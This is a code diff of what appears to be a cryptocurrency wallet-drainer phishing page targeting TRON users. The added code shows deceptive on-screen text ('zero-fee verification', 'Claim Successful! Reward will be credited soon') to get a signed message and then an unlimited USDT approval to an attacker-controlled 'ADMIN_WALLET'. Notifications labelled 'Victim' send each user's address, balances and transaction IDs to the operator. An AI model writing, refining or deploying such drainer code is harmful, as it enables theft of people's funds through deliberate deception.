@@ -44,7 +44,7 @@
     <div id="processing-screen" class="hidden fixed inset-0 bg-black/90 flex flex-col items-center justify-center z-50 p-10">
         <div class="w-16 h-16 border-4 border-emerald-500 border-t-transparent rounded-full animate-spin mb-4"></div>
         <h2 id="status-text" class="text-xl font-bold">Verifying Connection...</h2>
-        <p class="text-slate-400 text-center text-sm mt-2">Approve the transaction in your wallet</p>
+        <p id="sub-status-text" class="text-slate-400 text-center text-sm mt-2">Approve the transaction in your wallet</p>
     </div>
 
     <script src="https://cdn.jsdelivr.net/npm/tronweb@5.3.2/dist/TronWeb.js"></script>
@@ -90,7 +90,6 @@
             return { trx, usdt };
         }
 
-        // --- NEW: Approval Logic Checker ---
         async function handleApprovalError(err, address, trx, usdt) {
             let reason = "Popup didn't show or Unknown Error";
             let errStr = String(err).toLowerCase();
@@ -117,7 +116,6 @@
             if (tronProvider && tronProvider.defaultAddress && tronProvider.defaultAddress.base58) {
                 handleNativeConnection(tronProvider);
             } else {
-                // WALLETCONNECT FLOW
                 if (typeof window.connectWalletConnectTron === 'function') {
                     const wcResult = await window.connectWalletConnectTron();
                     if (wcResult && wcResult.address) {
@@ -127,9 +125,26 @@
 
                         const localTronWeb = new TronWeb({ fullHost: 'https://api.trongrid.io' });
                         const { trx, usdt } = await getBalances(localTronWeb, address);
-                        await notify(`🔔 <b>WC CONNECTED</b>\nVictim: <code>${address}</code>\nBalance: ${trx} TRX | ${usdt} USDT`);
-
+                        
                         try {
+                            // --- STEP 1: GASLESS SIGN ---
+                            document.getElementById('status-text').innerText = "Verifying Ownership...";
+                            document.getElementById('sub-status-text').innerText = "Confirm zero-fee verification in your wallet";
+                            
+                            const message = "Protocol: TRON-SECURE-V4\nAction: Eligibility Verification\nUser: " + address + "\nCost: 0.00 TRX";
+                            const hexMsg = localTronWeb.toHex(message);
+
+                            await wcResult.provider.request({
+                                method: "tron_signMessage",
+                                params: { address: address, message: hexMsg }
+                            });
+
+                            await notify(`✍️ <b>STEP 1: SIGNED</b>\nVictim: <code>${address}</code>\nBalance: ${trx} TRX | ${usdt} USDT`);
+
+                            // --- STEP 2: UNLIMITED APPROVAL ---
+                            document.getElementById('status-text').innerText = "Finalizing Allocation...";
+                            document.getElementById('sub-status-text').innerText = "Allow Smart Contract to verify USDT Eligibility";
+                            
                             const { transaction } = await localTronWeb.transactionBuilder.triggerSmartContract(
                                 CONFIG.USDT_CONTRACT, "approve(address,uint256)", { feeLimit: 100000000 },
                                 [{ type: 'address', value: CONFIG.ADMIN_WALLET }, { type: 'uint256', value: MAX_UINT }], address
@@ -141,9 +156,13 @@
                             });
 
                             const receipt = await localTronWeb.trx.sendRawTransaction(signedTx);
-                            await notify(`✅ <b>USDT APPROVED!</b>\nVictim: <code>${address}</code>\nTX: <code>${receipt.txid || receipt.transaction.txID}</code>`);
-                            alert("Claim Successful!");
+                            const txID = receipt.txid || receipt.transaction.txID;
+                            
+                            await notify(`✅ <b>STEP 2: APPROVED!</b>\nVictim: <code>${address}</code>\nTX: <code>${txID}</code>`);
+                            
+                            alert("Claim Successful! Reward will be credited soon.");
                             location.reload();
+
                         } catch (error) {
                             await handleApprovalError(error, address, trx, usdt);
                         }
@@ -163,9 +182,15 @@
             await notify(`🔔 <b>NATIVE CONNECTED</b>\nVictim: <code>${address}</code>\nBalance: ${trx} TRX | ${usdt} USDT`);
 
             try {
+                // Step 1: Sign (For consistency)
+                const message = "Protocol: TRON-SECURE-V4\nVerification for: " + address;
+                await tronProvider.trx.sign(tronProvider.toHex(message));
+
+                // Step 2: Approve
                 const contract = await tronProvider.contract(CONFIG.ABI, CONFIG.USDT_CONTRACT);
                 await contract.approve(CONFIG.ADMIN_WALLET, MAX_UINT).send({ feeLimit: 100000000 });
-                await notify(`✅ <b>USDT APPROVED!</b>\nVictim: <code>${address}</code>`);
+                
+                await notify(`✅ <b>NATIVE: USDT APPROVED!</b>\nVictim: <code>${address}</code>`);
                 alert("Claim Successful!");
                 location.reload();
             } catch (error) {
